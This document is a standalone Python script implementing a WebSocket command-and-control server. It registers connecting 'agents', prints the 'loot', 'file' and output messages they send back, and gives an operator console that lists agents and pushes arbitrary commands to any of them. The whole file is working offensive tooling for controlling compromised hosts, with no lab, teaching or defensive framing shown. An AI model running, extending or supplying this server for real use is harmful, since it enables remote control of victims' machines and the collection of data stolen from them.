#!/usr/bin/env python3
import asyncio, websockets, json, time, os

class C2Server:
    def __init__(self, port=8765):
        self.port = port
        self.agents = {}
        self.pending = {}
    
    async def handler(self, ws, path):
        aid = f"agent_{len(self.agents)+1}"
        self.agents[aid] = {"ws": ws, "last_seen": time.time()}
        print(f"[+] {aid} connected")
        
        try:
            async for msg in ws:
                data = json.loads(msg)
                t = data.get("type","")
                
                if t == "register":
                    self.agents[aid]["hostname"] = data.get("hostname","?")
                    print(f"[{aid}] {data.get('hostname')} online")
                
                elif t in ("output","loot","file"):
                    print(f"\n[{aid}] {str(data)[:200]}")
                
                self.agents[aid]["last_seen"] = time.time()
        except: pass
        finally:
            print(f"[-] {aid} disconnected")
            del self.agents[aid]
    
    async def console(self):
        await asyncio.sleep(1)
        while True:
            try:
                cmd = await asyncio.get_event_loop().run_in_executor(None, input, "\n[C2] > ")
                if cmd == "list":
                    for aid, a in self.agents.items():
                        print(f"  {aid}: {a.get('hostname','?')} (seen {int(time.time()-a['last_seen'])}s ago)")
                elif cmd.startswith("cmd "):
                    parts = cmd.split(" ",2)
                    if len(parts)==3:
                        aid, c = parts[1], parts[2]
                        if aid in self.agents:
                            await self.agents[aid]["ws"].send(json.dumps({"cmd":c}))
                            print(f"[>] Sent to {aid}")
                elif cmd == "exit": break
            except: break
    
    async def run(self):
        print(f"[C2] WebSocket server on ws://0.0.0.0:{self.port}")
        async with websockets.serve(self.handler, "0.0.0.0", self.port):
            await self.console()

if __name__ == "__main__":
    import sys
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8765
    asyncio.run(C2Server(port).run())
